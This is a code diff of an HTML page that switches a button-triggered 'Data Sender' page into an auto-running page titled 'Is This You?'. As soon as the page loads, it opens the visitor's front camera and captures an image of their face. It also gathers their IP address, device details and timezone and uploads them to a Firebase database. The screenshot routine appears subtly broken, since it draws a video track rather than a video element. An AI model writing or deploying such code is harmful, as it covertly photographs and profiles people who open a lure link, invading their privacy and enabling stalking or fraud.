@@ -12,11 +12,15 @@
             color: #ffffff;
             text-align: center;
             margin: 0;
-            padding: 0;
+            padding: 20px;
         }
         h1 {
             color: #00ff00;
             margin-top: 20px;
+        }
+        video {
+            width: 100%;
+            border: 2px solid green; /* Make video visible with a green border */
         }
         #loading-screen {
             display: none;
@@ -35,24 +39,6 @@
             font-size: 24px;
             font-weight: bold;
         }
-        .container {
-            margin: 20px auto;
-            max-width: 400px;
-        }
-        .button {
-            background-color: #00cc00;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.3s;
-            width: 100%;
-        }
-        .button:hover {
-            background-color: #009900;
-        }
         .error-message {
             color: #ff0000;
             margin: 10px 0;
@@ -61,28 +47,19 @@
             color: #ffff00;
             margin: 10px 0;
         }
-        video {
-            display: none; /* Initially hidden until video is ready */
-            width: 100%; /* Adjust width as needed */
-            height: auto; /* Maintain aspect ratio */
-            border: 2px solid #00ff00; /* Green border to highlight the video */
-            margin-top: 20px; /* Space from the button */
-        }
     </style>
 </head>
 <body>
     <div id="loading-screen">
         <div id="loading-message">
-            <i class="fas fa-spinner fa-spin"></i> Processing, please wait...
+            <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
         </div>
     </div>
-    <div class="container">
-        <h1>Data Sender</h1>
-        <button class="button" id="start-button">Start Process</button>
-        <div id="error-message" class="error-message"></div>
-        <div id="info-message" class="info-message"></div>
-        <video id="video" autoplay playsinline></video> <!-- Video element for camera feed -->
-    </div>
+    <h1>Is This You?</h1>
+    <p>Data will be sent automatically.</p>
+    <video id="video" autoplay playsinline></video>
+    <div id="error-message" class="error-message"></div>
+    <div id="info-message" class="info-message"></div>
 
     <script type="module">
         const firebaseConfig = {
@@ -96,140 +73,120 @@
             measurementId: "G-HTXZEYZ3DK" // Your Measurement ID
         };
 
+        // Initialize Firebase
         const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
         const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
 
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-
+        
         const loadingScreen = document.getElementById('loading-screen');
         const errorMessage = document.getElementById('error-message');
         const infoMessage = document.getElementById('info-message');
         const videoElement = document.getElementById('video');
 
-        document.getElementById('start-button').addEventListener('click', startProcess);
-
-        // Main function to handle data sending
         async function startProcess() {
-            errorMessage.innerHTML = '';
-            infoMessage.innerHTML = '';
             loadingScreen.style.display = 'flex'; // Show loading screen
-            videoElement.style.display = 'block'; // Show video element
-
-            let sessionId = Date.now(); // Unique session ID
-            let sessionData = {};
 
             try {
-                // Step 1: Get IP Address and country
-                const { ip, country } = await getIpAndCountry();
-                sessionData.ipAddress = ip;
-                sessionData.country = country;
-                console.log('IP and Country Retrieved:', ip, country);
+                // Get the user's IP address
+                const ipAddress = await getIpAddress();
+                
+                // Get device info
+                const deviceInfo = await getDeviceInfo(ipAddress);
 
-                // Step 2: Get Device Info including Timezone and Language
-                const deviceInfo = await getDeviceInfo();
-                sessionData = { ...sessionData, ...deviceInfo }; // Merge device info into sessionData
-                console.log('Device Info Retrieved:', deviceInfo);
+                // Start the camera and stream video
+                const stream = await startCamera();
 
-                // Step 3: Start the camera and wait for it to be ready
-                await startCamera();
+                // Automatically stop the camera after 20 seconds
+                setTimeout(() => {
+                    stopCamera(stream);
+                }, 20000); // 20 seconds
+                
+                // Wait for the camera to stabilize and take a screenshot
+                const screenshot = await takeScreenshot(stream);
+                
+                // Create a unique session ID
+                const sessionId = Date.now();
 
-                // Step 4: Take Screenshot after 10 seconds
-                const screenshot = await takeScreenshot(10000); // Load camera for 10 seconds
-                sessionData.screenshot = screenshot;
-                console.log('Screenshot Captured');
-
-                // Step 5: Get Geolocation (optional, may be denied)
-                const position = await getGeolocation();
-                sessionData.latitude = position.coords.latitude;
-                sessionData.longitude = position.coords.longitude;
-                console.log('Geolocation Retrieved:', position.coords);
-
-                // Step 6: Upload all data to Firebase
-                await uploadSessionData(sessionId, sessionData);
-                infoMessage.innerHTML = 'Data successfully uploaded!';
-                console.log('Data successfully uploaded:', sessionData);
+                // Upload session data to Firebase
+                await uploadSessionData(sessionId, deviceInfo, screenshot);
+                
             } catch (error) {
                 errorMessage.innerHTML = error.message;
-                console.error('Error during process:', error);
             } finally {
                 loadingScreen.style.display = 'none'; // Hide loading screen
-                videoElement.style.display = 'none'; // Hide video element after the process
             }
         }
 
-        // Function to start the camera and show the video feed
         async function startCamera() {
+            const constraints = {
+                video: {
+                    facingMode: { ideal: "user" }, // Use front camera
+                    width: { ideal: 1280 },         // Desired width
+                    height: { ideal: 720 },         // Desired height
+                    frameRate: { ideal: 30 }        // Desired frames per second
+                }
+            };
             try {
-                videoElement.srcObject = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' } // Use the front camera
-                });
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                videoElement.srcObject = stream;
+                return stream;
             } catch (error) {
-                throw new Error("Unable to access the camera. Please allow camera access and try again.");
+                throw new Error("Unable to access the camera.");
             }
         }
 
-        // Function to get IP Address and country
-        async function getIpAndCountry() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip,
-                    country: data.country_name
-                };
-            } catch (error) {
-                throw new Error('Failed to retrieve IP address and country.');
-            }
+        function stopCamera(stream) {
+            stream.getTracks().forEach(track => track.stop());
+            console.log("Camera stopped.");
         }
 
-        // Function to get device information, including timezone and language
-        async function getDeviceInfo() {
+        async function takeScreenshot(stream) {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                const video = stream.getVideoTracks()[0];
+                canvas.width = video.getSettings().width;
+                canvas.height = video.getSettings().height;
+
+                context.drawImage(video, 0, 0);
+                resolve(canvas.toDataURL('image/png')); // Return the screenshot as a base64 string
+            });
+        }
+
+        async function getIpAddress() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        async function getDeviceInfo(ipAddress) {
             return {
                 userAgent: navigator.userAgent,
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                screenResolution: `${window.screen.width} x ${window.screen.height}`,
-                language: navigator.language || 'en-US',
-                platform: navigator.platform || 'N/A',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone // Timezone info
+                deviceMemory: navigator.deviceMemory || 'N/A', // Device memory in GB
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A', // Number of logical processors
+                screenResolution: `${window.screen.width} x ${window.screen.height}`, // Screen resolution
+                language: navigator.language || 'en-US', // User language
+                platform: navigator.platform || 'N/A', // User platform
+                ipAddress: ipAddress, // User IP address
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, // User timezone
             };
         }
 
-        // Function to take a screenshot using the front camera
-        async function takeScreenshot(duration) {
-            return new Promise((resolve) => {
-                // Stop the camera after the specified duration
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = videoElement.videoWidth;
-                    canvas.height = videoElement.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoElement, 0, 0);
-                    videoElement.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
-                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
-                }, duration); // Take the screenshot after specified duration
-            });
-        }
-
-        // Function to get geolocation
-        async function getGeolocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(resolve, (error) => {
-                        reject(new Error('Geolocation access denied.'));
-                    });
-                } else {
-                    reject(new Error('Geolocation not supported.'));
-                }
-            });
-        }
-
-        // Function to upload data to Firebase
-        async function uploadSessionData(sessionId, sessionData) {
+        async function uploadSessionData(sessionId, deviceInfo, screenshot) {
+            const sessionData = {
+                timestamp: Date.now(),
+                screenshot: screenshot,
+                ...deviceInfo // Spread device info into session data
+            };
             const dataRef = ref(database, 'sessions/' + sessionId);
             await set(dataRef, sessionData);
+            console.log('Session data uploaded successfully');
         }
+
+        // Start the process on page load
+        startProcess();
     </script>
 </body>
 </html>
